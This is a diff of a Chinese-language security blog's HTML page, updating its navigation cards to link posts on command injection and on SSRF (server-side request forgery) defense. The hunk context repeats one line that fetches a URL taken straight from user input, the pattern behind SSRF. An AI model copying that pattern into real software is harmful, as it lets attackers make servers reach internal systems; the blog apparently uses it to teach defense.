+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2026/08/08/2026-08-08-command-injection-principles-and-defense/">
                     <div class="card-image">
@@ -1093,9 +1136,9 @@ const response = await axios.get(userInput);
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-08-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-08-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1104,6 +1147,7 @@ const response = await axios.get(userInput);
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1130,13 +1174,13 @@ const response = await axios.get(userInput);
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/08/07/2026-08-07-http-request-response-security-landscape/">
+                <a href="/2026/08/08/2026-08-08-ssrf-attacks-principles-and-defense/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="HTTP 请求响应全景：从协议结构看 Web 攻击的本质">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="SSRF 服务端请求伪造：原理、攻击与防御">
                         
-                        <span class="card-title">HTTP 请求响应全景：从协议结构看 Web 攻击的本质</span>
+                        <span class="card-title">SSRF 服务端请求伪造：原理、攻击与防御</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1147,7 +1191,7 @@ const response = await axios.get(userInput);
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2026-08-07
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-08-08
                             </span>
                         <span class="publish-author">
                             
@@ -1168,8 +1212,8 @@ const response = await axios.get(userInput);
                         <span class="chip bg-color">Web安全</span>
                     </a>
                     
-                    <a href="/tags/HTTP/">
-                        <span class="chip bg-color">HTTP</span>
+                    <a href="/tags/SSRF/">
+                        <span class="chip bg-color">SSRF</span>
                     </a>
                     
                 </div>
